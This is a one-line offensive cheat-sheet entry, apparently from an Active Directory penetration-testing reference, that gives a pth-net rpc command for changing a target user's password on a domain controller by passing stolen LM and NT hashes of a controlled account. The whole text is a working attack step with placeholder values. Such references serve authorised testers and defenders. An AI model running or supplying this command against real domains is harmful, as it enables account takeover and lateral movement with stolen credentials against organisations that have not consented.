Change target accounts password using pass-the-hash authentication:
```
pth-net rpc password "<targetUser>" "<newPass>" -U "<domain>"/"<controlledUser>"%"<LMHash>":"<NTHash>" -S "DC IP"
```

